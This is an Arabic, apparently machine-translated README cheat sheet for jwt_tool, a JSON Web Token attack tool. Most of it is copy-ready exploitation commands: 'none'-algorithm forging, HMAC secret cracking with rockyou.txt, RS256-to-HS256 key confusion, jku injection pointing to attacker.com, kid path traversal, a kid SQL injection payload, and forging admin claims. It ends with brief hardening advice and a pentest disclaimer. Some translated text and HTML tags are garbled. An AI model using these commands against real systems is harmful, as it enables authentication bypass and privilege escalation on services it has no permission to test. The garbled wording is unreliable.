<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🪙 jwt_tool - ورقة الغش الكاملة

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
       ██╗██╗    ██╗████████╗    ████████╗ ██████╗  ██████╗ ██╗     
       ██║██║    ██║╚══██╔══╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
       ██║██║ █╗ ██║   ██║          ██║   ██║   ██║██║   ██║██║     
  ██   ██║██║███╗██║   ██║          ██║   ██║   ██║██║   ██║██║     
  ╚█████╔╝╚███╔███╔╝   ██║          ██║   ╚██████╔╝╚██████╔╝███████╗
   ╚════╝  ╚══╝╚══╝    ╚═╝          ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
        All-in-One JSON Web Token Manipulation & Exploitation Suite
```
<p align="center">
  <img src="https://img.shields.io/badge/jwt__tool-Token_Exploitation-blue?style=for-the-badge" alt="jwt_tool">
  <img src="https://img.shields.io/badge/Author-ticarpi-orange?style=for-the-badge" alt="ticarpi">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="أمان الويب">
  <img src="https://img.shields.io/badge/License-GPLv3-purple?style=for-the-badge" alt="GPLv3">
</ص>

<p align="center">
  <b>🪙 مجموعة أدوات Python CLI القوية لتحليل رموز JSON Web Tokens (JWT) والتلاعب بها وتزويرها ومسحها ضوئيًا وتكسيرها</b>
</ص>

---

## 📋 جدول المحتويات

- [نظرة عامة وتشريح JWT](#-نظرة عامة--JWT-تشريح)
- [التثبيت](#-التثبيت)
- [تحليل الرمز المميز وفحصه](#-تحليل الرمز المميز--الفحص)
- [الفحص الآلي للثغرات الأمنية (`-M at`)](#-الفحص الآلي للثغرات الأمنية--m-at)
- [سيناريوهات الاستغلال الشائعة](#-سيناريوهات الاستغلال الشائعة)
  - [ارتباك الخوارزمية / لا يوجد هجوم (`none`)](#ارتباك الخوارزمية--لا شيء-هجوم-لا شيء)
  - [اختراق مفتاح HMAC السري](#hmac-secret-key-cracking)
  - [ارتباك المفاتيح: RS256 إلى HS256 مع المفتاح العام](#key-confusion-rs256-to-hs256-with-public-key)
  - [حقن الرأس: انتحال JKU وX5U وJWK](#header-injection-jku-x5u--jwk-spoofing)
  - [حقن KID (SQLi واجتياز المسار)](#kid-injection-sqli--path-traversal)
- [مطالبات التلاعب بالحمولة والتزوير](#-التلاعب بالحمولة--مطالبات التزوير)
- [الجدول المرجعي السريع](#-الجدول المرجعي السريع)
- [الاعتبارات الدفاعية والتصلب](#-الاعتبارات الدفاعية--التصلب)
- [إخلاء المسؤولية القانونية](#-إخلاء المسؤولية القانونية)

---

## 🎯 نظرة عامة وتشريح JWT

يتكون رمز ويب JSON (RFC 7519) من ثلاثة أجزاء مشفرة بـ Base64URL مفصولة بنقاط (`.`):
`header.payload.signature`

1. **الرأس:** يحدد نوع الرمز المميز (`typ`) وخوارزمية التوقيع (`alg`، على سبيل المثال، `HS256`، `RS256`، `none`).
2. **الحمولة:** تحتوي على مطالبات المستخدم (`sub`، `role`، `admin`، `exp`).
3. **التوقيع:** تجزئة التحقق التشفيري تمنع التلاعب من جانب العميل.

تم إنشاء **jwt_tool** بواسطة **ticarpi**، ويقوم بأتمتة اختبار العيوب المعمارية والتنفيذية في سير عمل مصادقة JWT عبر واجهات برمجة التطبيقات وتطبيقات الويب الحديثة.

---

## 📥 التثبيت
```bash
# Clone the repository
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool

# Install dependencies
pip install -r requirements.txt

# Run jwt_tool
python3 jwt_tool.py --help
```
---

## 🔍 تحليل وفحص الرمز المميز

فك تشفير وفحص معلمات الرأس ومطالبات الحمولة:
```bash
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOmZhbHNlfQ.signature
```
---

## ⚡ المسح الآلي للثغرات الأمنية (`-M at`)

قم بتشغيل عمليات فحص قواعد اللعبة الآلية لاختبار نقاط الضعف المعروفة ضد خدمة الويب المستهدفة:
```bash
# Run All Tests (-M at) sending requests to web endpoint
python3 jwt_tool.py <JWT_TOKEN> \
  -M at \
  -u "https://api.target.com/user/profile" \
  -rh "Authorization: Bearer <JWT_TOKEN>"
```
*الاختبارات المنفذة:*
- تجريد التوقيع (لا توجد متغيرات خوارزمية)
- RSA إلى الارتباك مفتاح HMAC
- التلاعب بالمطالبة (`admin=true`، تصعيد الامتيازات)
- الحقن في رؤوس `kid`، `jku`، `x5u`
- التعامل مع التوقيع الفارغ

---

## 💥سيناريوهات الاستغلال الشائعة

### ارتباك الخوارزمية / لا يوجد هجوم (`none`)
عندما تقبل تطبيقات الواجهة الخلفية الرموز المميزة غير الموقعة:
```bash
# Forge token with 'none' algorithm and stripped signature
python3 jwt_tool.py <JWT_TOKEN> -X a
```
*تم اختبار المتغيرات تلقائيًا:* `none`، `None`، `NONE`، `nOnE`.

### تكسير المفتاح السري لـ HMAC
عندما يستخدم HS256/HS384/HS512 عبارة مرور ضعيفة:
```bash
# Dictionary attack using rockyou.txt
python3 jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt
```
### الارتباك الرئيسي: RS256 إلى HS256 مع المفتاح العام
إذا قام الخادم بالتوقيع باستخدام RSA (RS256) ولكنه يقبل HMAC (HS256) باستخدام شهادته العامة كمفتاح HMAC مشترك:
```bash
# Forge token using server public key file
python3 jwt_tool.py <JWT_TOKEN> -X k -pk public.pem
```
### حقن الرأس: خداع JKU وX5U وJWK
إدخال مفاتيح أو عناوين URL يتحكم فيها المهاجم:
```bash
# Inject attacker-controlled JWKS URL in jku header
python3 jwt_tool.py <JWT_TOKEN> -I -hc jku -hv "https://attacker.com/jwks.json" -S hs256 -k secret
```
### حقن KID (SQLi واجتياز المسار)
إذا كانت الواجهة الخلفية تستخدم معلمة رأس `kid` (معرف المفتاح) مباشرة في استعلامات قاعدة البيانات أو مسارات الملفات:
```bash
# Path traversal pointing to /dev/null (empty secret)
python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "/dev/null" -S hs256 -p ""

# SQL Injection in kid header to bypass signature verification
python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "key1' UNION SELECT 'my_secret'--" -S hs256 -p "my_secret"
```
---

## ✍️ التلاعب بالحمولة وتزوير المطالبات

تعديل قيم مطالبة محددة واستقالة الرمز المميز:
```bash
# Change claim 'admin' to true and 'role' to 'SuperAdmin' using known secret
python3 jwt_tool.py <JWT_TOKEN> \
  -T \
  -pc "admin" -pv "true" \
  -pc "role" -pv "SuperAdmin" \
  -k "secret_key"
```
---

## ⚡ جدول مرجعي سريع

| الهدف | الأمر |
|-----------|--------|
| **فك التشفير والتحليل المميز** | `python3 jwt_tool.py <JWT>` |
| ** مسح قواعد اللعبة الكل في واحد ** | `python3 jwt_tool.py <JWT> -M at -u <URL> -rh "Auth: Bearer <JWT>"` |
| **الكراك سر HMAC** | `python3 jwt_tool.py <JWT> -C -d rockyou.txt` |
| ** تجاوز بدون خوارزمية ** | `python3 jwt_tool.py <JWT> -X a` |
| **RS256 -> ارتباك HS256** | `python3 jwt_tool.py <JWT> -X k -pk public.pem` |
| ** حمولة العبث والتوقيع ** | `python3 jwt_tool.py <JWT> -T -pc admin -pv true -k <KEY>` |
| ** اجتياز مسار الطفل ** | `python3 jwt_tool.py <JWT> -I -hc kid -hv "/dev/null" -S hs256 -p ""` |

---

## 🛡️ الاعتبارات الدفاعية والتصلب

1. **القائمة البيضاء الصارمة للخوارزميات:** لا تقبل مطلقًا `none` أو تبديل الخوارزمية. التحقق بشكل صريح من الخوارزميات المتوقعة (`RS256` فقط).
2. **رفض المفاتيح التي يتحكم فيها العميل:** لا تثق بشكل أعمى في رؤوس `jku`، أو `jwk`، أو `x5u` من المدخلات غير الموثوق بها دون قوائم السماح الصارمة للنطاق.
3. **استخدم الأسرار القوية:** تأكد من أن مفاتيح HMAC تحتوي على 256 بت على الأقل من البايتات العشوائية المشفرة ذات الإنتروبيا العالية.

---

## ⚠️إخلاء المسؤولية القانونية

> [!تنبيه]
> تم تصميم jwt_tool بشكل صارم لاختبارات الاختراق المعتمدة، وتقييمات نقاط ضعف واجهة برمجة التطبيقات (API)، والأبحاث التعليمية. يعد تزوير الرموز المميزة للوصول إلى أنظمة غير مصرح بها دون إذن كتابي أمرًا غير قانوني تمامًا.